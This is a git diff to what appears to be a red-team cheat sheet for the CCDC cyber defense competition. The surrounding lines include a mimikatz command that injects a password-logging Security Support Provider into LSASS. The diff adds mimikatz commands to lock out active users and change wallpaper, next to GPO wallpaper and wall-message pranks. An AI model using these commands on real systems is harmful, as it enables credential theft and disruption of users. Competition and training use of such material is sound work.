@@ -73,6 +73,7 @@ pagetitle: Red Teaming for CCDC
 **MemSSP**
 - Injects a new Security Support Provider into LSASS
 - `mimikatz "privilege::debug" "misc::memssp" "exit"`
+  - Can follow this up with `misc::lock /process:explorer.exe` to LOG OUT active users!!
 - After each authentication, password is stored in `C:\Windows\System32\mimilsa.log` or `C:\Windows\System32\kiwissp.log`
 
 **Golden Certificate**
@@ -161,6 +162,7 @@ pagetitle: Red Teaming for CCDC
 - `wall "dance"`
 - Set all computers to same background:
   - GPO management > right-click domain > Create GPO in domain and link here > Right click on new GPO + edit > User Configuration\Policies\Administrative Templates\Desktop\Desktop > desktop wallpaper > select `enabled` + enter path of image and select fill for style > apply + ok > `gpupdate /force`
+- `misc::wp /file:{path}` to set the current PC's wallpaper
 
 ## Dealing with System Protections
 
